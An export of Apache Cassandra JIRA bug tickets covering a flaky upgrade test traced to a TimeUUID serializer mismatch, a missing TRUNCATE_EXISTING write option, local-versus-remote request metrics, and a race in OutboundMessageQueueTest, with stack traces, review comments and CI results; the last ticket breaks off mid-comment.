Flaky upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_current_4_0_x_To_indev_trunk.test_noncomposite_static_cf,CASSANDRA-17451,13434516,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,smiklosovic,smiklosovic,18/Mar/22 08:13,27/May/22 19:25,13/Jul/23 08:40,04/May/22 06:20,4.1,4.1-alpha1,,,,,CI,,,,0,,"dtest-upgrade.upgrade_tests.cql_tests TestCQLNodes2RF1_Upgrade_current_4_0_x_To_indev_trunk test_noncomposite_static_cf is flaky.

{code}
Error Message
cassandra.WriteFailure: Error from server: code=1500 [Replica(s) failed to execute write] message=""Operation failed - received 1 responses and 1 failures: UNKNOWN from /127.0.0.1:7000"" info={'consistency': 'ONE', 'required_responses': 1, 'received_responses': 1, 'failures': 1, 'error_code_map': {'127.0.0.1': '0x0000'}}
Stacktrace
self = <abc.TestCQLNodes2RF1_Upgrade_current_4_0_x_To_indev_trunk object at 0x7fc77ceb7d00>

    def test_noncomposite_static_cf(self):
        """""" Test non-composite static CF syntax """"""
        cursor = self.prepare()
    
        # Create
        cursor.execute(""""""
                CREATE TABLE users (
                    userid uuid PRIMARY KEY,
                    firstname ascii,
                    lastname ascii,
                    age int
                ) WITH COMPACT STORAGE;
            """""")
    
        for is_upgraded, cursor in self.do_upgrade(cursor):
            logger.debug(""Querying {} node"".format(""upgraded"" if is_upgraded else ""old""))
            cursor.execute(""TRUNCATE users"")
    
            # Inserts
            cursor.execute(""INSERT INTO users (userid, firstname, lastname, age) VALUES (550e8400-e29b-41d4-a716-446655440000, 'Frodo', 'Baggins', 32)"")
            cursor.execute(""UPDATE users SET firstname = 'Samwise', lastname = 'Gamgee', age = 33 WHERE userid = f47ac10b-58cc-4372-a567-0e02b2c3d479"")
    
            # Queries
            assert_one(cursor, ""SELECT firstname, lastname FROM users WHERE userid = 550e8400-e29b-41d4-a716-446655440000"", ['Frodo', 'Baggins'])
    
            assert_one(cursor, ""SELECT * FROM users WHERE userid = 550e8400-e29b-41d4-a716-446655440000"",
                       [UUID('550e8400-e29b-41d4-a716-446655440000'), 32, 'Frodo', 'Baggins'])
            # FIXME There appears to be some sort of problem with reusable cells
            # when executing this query.  It's likely that CASSANDRA-9705 will
            # fix this, but I'm not 100% sure.
            assert_one(cursor, ""SELECT * FROM users WHERE userid = f47ac10b-58cc-4372-a567-0e02b2c3d479"",
                       [UUID('f47ac10b-58cc-4372-a567-0e02b2c3d479'), 33, 'Samwise', 'Gamgee'])
            assert_all(cursor, ""SELECT * FROM users"",
                       [[UUID('f47ac10b-58cc-4372-a567-0e02b2c3d479'), 33, 'Samwise', 'Gamgee'],
                        [UUID('550e8400-e29b-41d4-a716-446655440000'), 32, 'Frodo', 'Baggins']])
    
            # Test batch inserts
>           cursor.execute(""""""
                    BEGIN BATCH
                        INSERT INTO users (userid, age) VALUES (550e8400-e29b-41d4-a716-446655440000, 36)
                        UPDATE users SET age = 37 WHERE userid = f47ac10b-58cc-4372-a567-0e02b2c3d479
                        DELETE firstname, lastname FROM users WHERE userid = 550e8400-e29b-41d4-a716-446655440000
                        DELETE firstname, lastname FROM users WHERE userid = f47ac10b-58cc-4372-a567-0e02b2c3d479
                    APPLY BATCH
                """""")

upgrade_tests/cql_tests.py:157: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
../venv/src/cassandra-driver/cassandra/cluster.py:2618: in execute
    return self.execute_async(query, parameters, trace, custom_payload, timeout, execution_profile, paging_state, host, execute_as).result()
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
{code}",,adelapena,benedict,e.dimitrova,marcuse,smiklosovic,,,,,,,,,,"smiklosovic closed pull request #1594: CASSANDRA-17451 use TimeUUID serializer for BATCH_REMOVE_REQ
URL: https://github.com/apache/cassandra/pull/1594


;09/May/22 10:18;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,CASSANDRA-17454,,,,,,,,,,,,CASSANDRA-17454,,,,,,,,,,CASSANDRA-17176,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed May 04 06:20:49 UTC 2022,,,,,,,All,,,,"0|z10lu8:",9223372036854775807,,,,benedict,,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/3b648ca09ecfc100d5ad2e3b462d4949dbc03498,,,,,,,,,jenkins run,,,,,"21/Mar/22 16:34;adelapena;Other varietions of this failure are:
 * [upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_indev_4_0_x_To_indev_trunk.test_noncomposite_static_cf|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/upgrade_tests.cql_tests/TestCQLNodes2RF1_Upgrade_indev_4_0_x_To_indev_trunk/test_noncomposite_static_cf]
 * [upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_current_3_11_x_To_indev_trunk.test_noncomposite_static_cf|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/upgrade_tests.cql_tests/TestCQLNodes2RF1_Upgrade_current_3_11_x_To_indev_trunk/test_noncomposite_static_cf]
 * [upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_current_3_0_x_To_indev_trunk.test_noncomposite_static_cf|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/upgrade_tests.cql_tests/TestCQLNodes2RF1_Upgrade_current_3_0_x_To_indev_trunk/test_noncomposite_static_cf]
 * [upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_indev_3_11_x_To_indev_trunk.test_noncomposite_static_cf|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/upgrade_tests.cql_tests/TestCQLNodes2RF1_Upgrade_indev_3_11_x_To_indev_trunk/test_noncomposite_static_cf]
 * [upgrade_tests.cql_tests.cls.test_noncomposite_static_cf|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/upgrade_tests.cql_tests/cls/test_noncomposite_static_cf]

This might have the same cause than CASSANDRA-17454.;;;","19/Apr/22 18:19;e.dimitrova;For the record, I noticed some class cast exception in the logs the other day, not sure what is the story there. Hope that info is useful. ;;;","20/Apr/22 14:48;brandon.williams;This bisects to CASSANDRA-17176, which makes sense from the log:

{noformat}
ERROR [Native-Transport-Requests-1] 2022-04-19 19:25:24,360 StorageProxy.java:1631 - Failed to apply mutation locally :
java.lang.ClassCastException: org.apache.cassandra.utils.TimeUUID cannot be cast to java.util.UUID
        at org.apache.cassandra.utils.UUIDSerializer.serializedSize(UUIDSerializer.java:28)
        at org.apache.cassandra.net.Message$Serializer.payloadSize(Message.java:1396)
        at org.apache.cassandra.net.Message$Serializer.access$1500(Message.java:691)
        at org.apache.cassandra.net.Message.payloadSize(Message.java:1462)
        at org.apache.cassandra.net.Message.access$900(Message.java:71)
        at org.apache.cassandra.net.Message$Serializer.serializedSizePost40(Message.java:867)
        at org.apache.cassandra.net.Message$Serializer.serializedSize(Message.java:724)
        at org.apache.cassandra.net.Message$Serializer.access$1400(Message.java:691)
        at org.apache.cassandra.net.Message.serializedSize(Message.java:1437)
        at org.apache.cassandra.net.OutboundConnections.connectionTypeFor(OutboundConnections.java:212)
        at org.apache.cassandra.net.OutboundConnections.connectionFor(OutboundConnections.java:204)
        at org.apache.cassandra.net.OutboundConnections.enqueue(OutboundConnections.java:93)
        at org.apache.cassandra.net.MessagingService.doSend(MessagingService.java:416)
        at org.apache.cassandra.net.OutboundSink.accept(OutboundSink.java:70)
        at org.apache.cassandra.net.MessagingService.send(MessagingService.java:405)
        at org.apache.cassandra.net.MessagingService.send(MessagingService.java:375)
        ...
{noformat};;;","28/Apr/22 17:00;marcuse;{{BATCH_REMOVE_REQ}} changed from {{UUID}} -> {{TimeUUID}} but the serializer didn't

https://github.com/apache/cassandra/pull/1594

trying to submit a jenkins run but nothing happens, will update once it goes through;;;","03/May/22 11:47;benedict;+1;;;","03/May/22 11:47;marcuse;tests: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1653/;;;","04/May/22 06:20;marcuse;and committed, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing TRUNCATE_EXISTING in write options,CASSANDRA-17439,13433795,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,jlewandowski,jlewandowski,15/Mar/22 05:26,27/May/22 19:25,13/Jul/23 08:40,15/Mar/22 10:28,4.1,4.1-alpha1,,,,,Legacy/Local Write-Read Paths,,,,0,,"`PathUtils.WRITE_OPTIONS` is meant to be used for overwriting files. However, without TRUNCATE_EXISTING option, it may overwrite only the beginning of the file if the new content is smaller than previous, which in turn may lead to unexpected file size and fail some tests unexpectedly.
",,benedict,jlewandowski,jmckenzie,,,,,,,,,,,,"belliottsmith merged pull request #1502:
URL: https://github.com/apache/cassandra/pull/1502


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Mar/22 10:26;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 15 18:53:11 UTC 2022,,,,,,,All,,,,"0|z10heg:",9223372036854775807,,,,benedict,,,,Low,,4.1,,"[0bbcc07b437e0ac117e03760841a45e670cec8ff|https://github.com/apache/cassandra/commit/0bbcc07b437e0ac117e03760841a45e670cec8ff]",,,,,,,,,run regression tests (and new tests),,,,,"15/Mar/22 05:38;jlewandowski;[PR|https://github.com/apache/cassandra/pull/1502] [j8|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/199/workflows/fdcc0a37-d804-41bd-a0bb-6cbe0a6c934d];;;","15/Mar/22 07:53;benedict;+1;;;","15/Mar/22 10:51;brandon.williams;I don't have a problem with this being committed, but a point of order: this did not meet the agreed upon and ratified requirement of two committers: https://cwiki.apache.org/confluence/display/CASSANDRA/Cassandra+Project+Governance;;;","15/Mar/22 10:52;benedict;Good point, my bad. I will revert.;;;","15/Mar/22 10:56;brandon.williams;It's fine, just wanted to call it out, +1.;;;","15/Mar/22 10:58;benedict;... and it's back :)

Thanks;;;","15/Mar/22 18:53;jmckenzie;3 failures new to the run for this ticket; none of them look related just glancing at the name.

 

[CI Results]
Branch: trunk, build number: 1011
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-trunk/trunk]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-trunk/1011/]
JIRA: CASSANDRA-17439
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=0bbcc07b437e0ac117e03760841a45e670cec8ff]
affected paths:
 * src/java/org/apache/cassandra/io/util/PathUtils.java
 * test/unit/org/apache/cassandra/io/util/FileTest.java

Build Result: UNSTABLE
Passing Tests: 44049
Failing Tests: 18
||Test|Failures|JIRA|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-compression|2 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.terminated successfully|1 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|junit.framework.TestSuite.org.apache.cassandra.distributed.test.CASMultiDCTest|3 of 63|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*test*%22]|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testCDCIndexFileWriteOnSync|3 of 63|CASSANDRA-17416?|
|org.apache.cassandra.distributed.test.trackwarnings.TombstoneCountWarningTest.failThresholdSinglePartition|4 of 63|CASSANDRA-17244?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade_with_internode_ssl|28 of 63|CASSANDRA-17305?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|28 of 63|CASSANDRA-17305?|
|org.apache.cassandra.db.commitlog.GroupCommitLogTest.testOutOfOrderLogDiscardWithCompaction[3]|1 of 63|CASSANDRA-17232?|
|dtest.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|9 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.CasCriticalSectionTest.criticalSectionTest|9 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-offheap.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|9 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|2 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade|29 of 63|CASSANDRA-17305?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade|29 of 63|CASSANDRA-17305?|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.tupleCkReadWriteDesc|2 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.KeywordTest.test[keyword INPUT isReserved false]|1 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-novnode.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|9 of 63|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance and Semantic Concerns w/ Metrics for Local vs. Remote Requests in StorageProxy,CASSANDRA-17424,13432709,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,maedhroz,maedhroz,08/Mar/22 22:49,27/May/22 19:24,13/Jul/23 08:40,29/Mar/22 16:59,4.1,4.1-alpha1,,,,,Observability/Metrics,,,,0,,"In CASSANDRA-10023, we added two new metrics to both {{ClientRequestMetrics}} and {{ClientWriteRequestMetrics}} to represent requests where the driver either does or does not make a correct token-aware choice of coordinator. (Auditing driver behavior is listed as the primary goal of that Jira.)

There are, however, a few concerns we should address before this releases in 4.1:

1.) With paging enabled and a LIMIT < fetch size, {{IN}} queries can hit {{fetchRows()}} multiple times, so the number of local + remote requests isn’t the same as the number of queries marked in {{ClientRequestMetrics}} in {{readRegular()}}.

2.) {{IN}} queries will potentially mark a bunch of “remote” requests even if one key in the {{IN}} set is “local”.

3.) Something similar happens with mutations. If {{StorageProxy#mutate()}} receives multiple mutations, we’ll mark against one of these new metrics in {{ClientWriteRequestMetrics}} for each mutation, while {{ClientWriteRequestMetrics}} will only register the actual client request once.

For cases 2 and 3, we may mark both local and remote requests for the same overall client request, which introduces ambiguity if these are intended to help audit driver coordinator selection behavior. There are a few options:

a.) We can accept the ambiguity, but then we haven’t really accomplished the goal of CASSANDRA-10023 for some request types.

b.) We can simply not record any of these metrics for requests where multiple partitions/tokens are involved.

c.) We can be lenient, marking requests as “local” if any of the partitions/tokens involved in the client request are, in fact, local.

“c” feels like the option that preserves as much functionality as possible without being ambiguous, but problem #2 above is still tricky, given the way IN and GROUP BY queries behave w/ paging. (Perhaps ambiguity in that case is acceptable?)

In addition to the general ambiguity around the above…

4.) There is excessive object creation involved (on a hot path) in our determination of whether a request is local or remote. We should be able to mitigate this by getting rid of {{AbstractReadExecutor#getContactedReplicas()}} and relying on {{ReplicaPlan#lookup()}} rather than creating strings. (Even for writes, we should be able to push down marking into performWrite(), where the write ReplicaPlan is already available.)",,e.dimitrova,jonmeredith,maedhroz,marcuse,,,,,,,,,,,"maedhroz commented on pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#issuecomment-1067357727


   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17424&filter=all


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;14/Mar/22 22:18;githubbot;600","maedhroz commented on a change in pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#discussion_r826431380



##########
File path: src/java/org/apache/cassandra/service/StorageProxy.java
##########
@@ -1027,11 +1011,6 @@ public static void mutateMV(ByteBuffer dataKey, Collection<Mutation> mutations,
                 // add a handler for each mutation - includes checking availability, but doesn't initiate any writes, yet
                 for (Mutation mutation : mutations)
                 {
-                    if (hasLocalMutation(mutation))
-                        writeMetrics.localRequests.mark();
-                    else
-                        writeMetrics.remoteRequests.mark();
-

Review comment:
       This codepath seems to be actuated by writes on the MV's base table, so it didn't seem correct to record anything around these metrics.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;14/Mar/22 22:28;githubbot;600","maedhroz commented on a change in pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#discussion_r826432113



##########
File path: src/java/org/apache/cassandra/service/StorageProxy.java
##########
@@ -1684,6 +1670,9 @@ protected Verb verb()
             // we build this ONLY to perform the sufficiency check that happens on construction
             ReplicaPlans.forWrite(keyspace, cm.consistency(), tk, ReplicaPlans.writeAll);
 
+            // This host isn't a replica, so mark the request as being remote.
+            writeMetrics.remoteRequests.mark();
+

Review comment:
       If this host is a replica, `applyCounterMutationOnCoordinator()` -> `performWrite()`, and there we'll mark a local request against the metrics.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;14/Mar/22 22:30;githubbot;600","jonmeredith commented on a change in pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#discussion_r831380891



##########
File path: src/java/org/apache/cassandra/service/StorageProxy.java
##########
@@ -1684,6 +1670,9 @@ protected Verb verb()
             // we build this ONLY to perform the sufficiency check that happens on construction
             ReplicaPlans.forWrite(keyspace, cm.consistency(), tk, ReplicaPlans.writeAll);
 
+            // This host isn't a replica, so mark the request as being remote.
+            writeMetrics.remoteRequests.mark();
+

Review comment:
       Is it worth being explicit in this comment that the other path will ultimately update the `localRequests` 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;21/Mar/22 17:41;githubbot;600","jonmeredith commented on pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#issuecomment-1074221370


   Looks like the original test is missing anything to test the counter path.


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;21/Mar/22 17:45;githubbot;600","jonmeredith commented on a change in pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#discussion_r831385433



##########
File path: src/java/org/apache/cassandra/service/reads/AbstractReadExecutor.java
##########
@@ -17,10 +17,8 @@
  */
 package org.apache.cassandra.service.reads;
 
-import java.util.List;
-import java.util.stream.Collectors;
-
 import com.google.common.base.Preconditions;
+import org.apache.cassandra.utils.FBUtilities;

Review comment:
       Out of order import




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;21/Mar/22 17:46;githubbot;600","maedhroz closed pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;29/Mar/22 16:58;githubbot;600","maedhroz commented on pull request #1501:
URL: https://github.com/apache/cassandra/pull/1501#issuecomment-1082133276


   Committed as https://github.com/apache/cassandra/commit/57ab3afcf16970047d3df4656241cf0705e94bee


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;29/Mar/22 16:58;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,CASSANDRA-10023,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Normal,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 29 16:59:02 UTC 2022,,,,,,,All,,,,"0|z10aqg:",9223372036854775807,,,,jmeredithco,marcuse,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/57ab3afcf16970047d3df4656241cf0705e94bee,,,,,,,,,n/a,,,,,"14/Mar/22 22:28;maedhroz;|trunk|
|[patch|https://github.com/apache/cassandra/pull/1501]|
|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17424&filter=all]|

I pushed up a first attempt at this. I've left the ambiguity around IN/GROUP BY alone for now, although I'm more than willing to revisit that if there's enough feedback. (See the PR for some inline notes...)

CC [~marcuse] [~brandon.williams] [~stefan.miklosovic];;;","21/Mar/22 17:50;jonmeredith;Patch looks good to me in current form, I added a couple of very minor comments to the PR.

I'd suggest we resolve any ambiguity in a follow up JIRA, and limit this to reducing the object creation/string search.;;;","29/Mar/22 05:55;marcuse;+1;;;","29/Mar/22 16:59;maedhroz;Committed as https://github.com/apache/cassandra/commit/57ab3afcf16970047d3df4656241cf0705e94bee;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.net.OutboundMessageQueueTest.testRemove-cdc,CASSANDRA-17422,13432675,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,jmckenzie,jmckenzie,08/Mar/22 17:04,07/Mar/23 10:38,13/Jul/23 08:40,18/Aug/22 07:40,4.0.6,4.1-beta1,5.0,,,,Test/unit,,,,0,,"Branch: 4.0
https://ci-cassandra.apache.org/job/Cassandra-4.0/350/testReport/org.apache.cassandra.net/OutboundMessageQueueTest/testRemove_cdc/

{code}
java.lang.NullPointerException
	at org.apache.cassandra.net.OutboundMessageQueueTest.testRemove(OutboundMessageQueueTest.java:91)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}

Failure: 1 of 3",,bereng,jmckenzie,skokoori,,,,,,,,,,,,"shyla226 opened a new pull request, #1702:
URL: https://github.com/apache/cassandra/pull/1702

   Fix for ticket CASSANDRA-17422: Test Failure: org.apache.cassandra.net.OutboundMessageQueueTest.testRemove-cdc


;23/Jun/22 18:06;githubbot;600","smiklosovic closed pull request #1702: CASSANDRA-17422: fix for OutboundMessageQueueTest.testRemove
URL: https://github.com/apache/cassandra/pull/1702


;22/Oct/22 11:30;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/22 00:35;skokoori;CASSANDRA-17422.patch;https://issues.apache.org/jira/secure/attachment/13045471/CASSANDRA-17422.patch",,,,,1.0,bereng,skokoori,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Sep 07 04:46:01 UTC 2022,,,brandon.williams,,,,All,,,,"0|z10aiw:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/9f97adf63c67c8671a5477e7fc62dab75326bd6e,,,,,,,,,Executed the test _OutboundMessageQueueTest.testRemove_ more than 100K iterations on my box multiple times,,,,,"17/Jun/22 22:17;skokoori;From my analysis, it looks like a timing issue.

Occasionally in this test, by the time code flow reaches the line
_try (OutboundMessageQueue.WithLock lock = queue.lockOrCallback(0, () -> {}))_

lock acquired on the queue prior to it has not been released. Therefore, lock has a null value resulting in the {_}NullPointerException{_}.
When I added _Uninterruptibles.awaitUninterruptibly(lockUntil)_ before the line of code mentioned above, test ran for a long time without failing. 

Another option to fix this test, perhaps is to add a callback and check for the content of the queue in the callback. ;;;","21/Jun/22 14:52;brandon.williams;Could you create a pull request with your fix?;;;","23/Jun/22 00:36;skokoori;I have attached a patch for review. Working on pull request;;;","23/Jun/22 18:09;skokoori;I have created a pull request with the changes;;;","24/Jun/22 19:09;brandon.williams;Thanks, I found it and linked it here.  While probably not entirely conclusive, [here|https://app.circleci.com/pipelines/github/driftx/cassandra/535/workflows/de2720c4-449e-4139-8cb9-006c91919482/jobs/6458/tests] are 10k runs unpatched showing the failure and [here|https://app.circleci.com/pipelines/github/driftx/cassandra/537/workflows/33f08814-afd1-45d3-a471-a512c6594219/jobs/6494] is the patched version showing success, and pre-commit runs for [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/536/workflows/265fb05e-5b1a-4c2b-8143-57b02e05ebee] and [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/536/workflows/2b676de0-e79e-47bc-ad98-0b2694b05293].

[~benedict] you wrote this test, would you like to review?;;;","10/Aug/22 09:35;bereng;I think the current PR changes the behavior of the test. Previously we were removing from the queue _while_ the lock acquired [here|https://github.com/apache/cassandra/pull/1777/files#diff-01005beb5774536671b8fed6d3f6b57c90d837257da7581ac12807c234140043R66] was being held, whereas in the new PR that is not the case iiuc.

But I have managed to repro locally with the repeatable runner, just adding to the test class:
{noformat}
@RunWith(RepeatableRunner.class)
@RepeatableRunnerConfiguration(iterations = 300000)
{noformat}

